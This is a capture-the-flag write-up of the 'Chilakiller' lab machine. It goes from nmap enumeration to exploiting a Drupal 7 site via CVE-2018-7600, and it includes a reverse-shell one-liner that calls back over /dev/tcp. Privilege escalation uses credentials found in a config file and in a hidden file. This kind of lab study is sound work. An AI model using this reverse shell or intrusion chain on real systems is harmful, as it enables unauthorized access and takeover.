# Chilakiller CTF

## Enumeration: 

Start off with an NMAP scan

```vim
nmap -Pn -sV -sC -v 10.150.150.182
```

We get an output that looks like this:

```vim
Nmap scan report for 10.150.150.182
Host is up (0.14s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 8e0a83306ba5ef12814a8e66c6f42212 (RSA)
|   256 ef775ea95919def8c3f31c2e73098a8f (ECDSA)
|_  256 b3be3b050cf76224ce1b5c5bdfccfc23 (ED25519)
80/tcp   open  http       nginx 1.4.0 (Ubuntu)
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 06 Dec 2022 18:03:38 GMT
|     Server: nginx 1.4.0 (Ubuntu)
|     Last-Modified: Sat, 01 Aug 2020 20:47:30 GMT
|     ETag: "264-5abd7039b3849"
|     Accept-Ranges: bytes
|     Content-Length: 612
|     Vary: Accept-Encoding
|     Connection: close
|     Content-Type: text/html
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>Welcome to nginx!</title>
|     <style>
|     body {
|     width: 35em;
|     margin: 0 auto;
|     font-family: Tahoma, Verdana, Arial, sans-serif;
|     </style>
|     </head>
|     <body>
|     <h1>Welcome to nginx!</h1>
|     <p>If you see this page, the nginx web server is successfully installed and
|     working. Further configuration is required.</p>
|     <p>For online documentation and support please refer to
|     href="http://nginx.org/">nginx.org</a>.<br/>
|     Commercial support is available at
|     href="http://nginx.com/">nginx.com</a>.</p>
|     <p><em>Thank you for using nginx.</em></p>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Tue, 06 Dec 2022 18:03:38 GMT
|     Server: nginx 1.4.0 (Ubuntu)
|     Allow: POST,OPTIONS,HEAD,HEAD,GET,HEAD
|     Content-Length: 0
|     Connection: close
|     Content-Type: text/html
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Date: Tue, 06 Dec 2022 18:03:38 GMT
|     Server: nginx 1.4.0 (Ubuntu)
|     Content-Length: 299
|     Connection: close
|     Content-Type: text/html; charset=iso-8859-1
|     <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
|     <html><head>
|     <title>400 Bad Request</title>
|     </head><body>
|     <h1>Bad Request</h1>
|     <p>Your browser sent a request that this server could not understand.<br />
|     </p>
|     <hr>
|     <address>nginx 1.4.0 (Ubuntu) Server at 127.0.1.1 Port 80</address>
|_    </body></html>
|_http-server-header: nginx 1.4.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Welcome to nginx!
8080/tcp open  http-proxy nginx 1.4.0 (Ubuntu)
|_http-server-header: nginx 1.4.0 (Ubuntu)
|_http-title: Welcome to nginx!
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 06 Dec 2022 18:03:38 GMT
|     Server: nginx 1.4.0 (Ubuntu)
|     Last-Modified: Sat, 01 Aug 2020 20:47:30 GMT
|     ETag: "264-5abd7039b3849"
|     Accept-Ranges: bytes
|     Content-Length: 612
|     Vary: Accept-Encoding
|     Connection: close
|     Content-Type: text/html
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>Welcome to nginx!</title>
|     <style>
|     body {
|     width: 35em;
|     margin: 0 auto;
|     font-family: Tahoma, Verdana, Arial, sans-serif;
|     </style>
|     </head>
|     <body>
|     <h1>Welcome to nginx!</h1>
|     <p>If you see this page, the nginx web server is successfully installed and
|     working. Further configuration is required.</p>
|     <p>For online documentation and support please refer to
|     href="http://nginx.org/">nginx.org</a>.<br/>
|     Commercial support is available at
|     href="http://nginx.com/">nginx.com</a>.</p>
|     <p><em>Thank you for using nginx.</em></p>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Tue, 06 Dec 2022 18:03:38 GMT
|     Server: nginx 1.4.0 (Ubuntu)
|     Allow: POST,OPTIONS,HEAD,HEAD,GET,HEAD
|     Content-Length: 0
|     Connection: close
|     Content-Type: text/html
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Date: Tue, 06 Dec 2022 18:03:38 GMT
|     Server: nginx 1.4.0 (Ubuntu)
|     Content-Length: 299
|     Connection: close
|     Content-Type: text/html; charset=iso-8859-1
|     <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
|     <html><head>
|     <title>400 Bad Request</title>
|     </head><body>
|     <h1>Bad Request</h1>
|     <p>Your browser sent a request that this server could not understand.<br />
|     </p>
|     <hr>
|     <address>nginx 1.4.0 (Ubuntu) Server at 127.0.1.1 Port 80</address>
|_    </body></html>
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-open-proxy: Proxy might be redirecting requests
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service
```

This shows us that port 22, port 80 and port 8080 are open. By the looks of it, port 80 and 8080 point to the same website. In order to proceed, we'll have to do directory fuzzing to see if there are any other pages that can be accessed.

Dirbuster reveals 2 interesting directories, `/manual` and `/restaurante` :
1. `/manual` is a Apache HTTP Server documentation
2. `/restaurante` seems to be a webapp for a restaurant, but is in spanish.

Since `/manual` doesn't seem to help me in any way, I decide to translate `/restaurante` and try to figure out if there could be any vulnerabilities.

## Exploit:

Looking into the source code for `/restaurante/index.php` , we come across the name for the CMS being used and its version number: Drupal 7

A quick look into searchsploit brings many exploits to our attention, however the one which worked for me happened to be this one:  [CVE-2018-7600](https://github.com/pimps/CVE-2018-7600)

Run `nc -lvnp 9000` and then run the following command:
```vim
python script.py -c 'echo "bash -i >& /dev/tcp/<IP_ADDR>/9000 0>&1" | bash' http://10.150.150.182/restaurante/
```

This lets us in to the machine as user `www-data` . You can find FLAG4 in `/var/www/html/restaurante/freegift.html` . 

FLAG1 can be found in `/var/www/html/test-site/test-2/FLAG1.txt` .

## Priv-Esc:

### www-data to user1:

Since running linpeas.sh wasn't working very well, I decided to look manually for any kind of config files or passwords. I come across the file `/var/www/html/restaurante/sites/default/settings.php` which contained the following code:

```php
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupaldb',
      'username' => 'drupal',
      'password' => 'EstaContraNoesTanImp0rtant3!!!',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => 'ptd_',
    ),
  ),
);
```

You can log into the database with `mysql -u drupal -p` and enter the password shown above. We can find a hash in ptd_users table.

As far as I could tell, this is a Drupal7 hash. However trying to crack this hash will give you the password as `admin` . This is incorrect as the password is actually `user1` (same as the name of the other user). I tried using `john` and `hashcat` to crack the hash with other wordlists but didn't have any luck so I am not sure as to what happened there.

Run `su user1` with the password `user1` and we can login.

FLAG3 can be found in `/home/user1/FLAG3.txt`

### user1 to root:

Run `id` on user1:

```vim
uid=1000(user1) gid=1000(user1) groups=1000(user1),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth),117(scanner),1001(ch)
```

user1 seems to be in many groups, my first action was to look at every group and see if I can find anything interesting. While looking at `ch` group, I found the following:

```vim
user1@chilakiller:~$ find / -group ch 2>/dev/null
/etc/openvpn/client/.config/.5OBdDQ80Py

user1@chilakiller:~$ cat /etc/openvpn/client/.config/.5OBdDQ80Py
hUqJ2
ChilaKill3s_Tru3_L0v3R
```

`ChilaKill3s_Tru3_L0v3R` seemed to look like a password so I tried `su root` and it gave me access.

FLAG2 can be found in: `/root/FLAG2.txt`
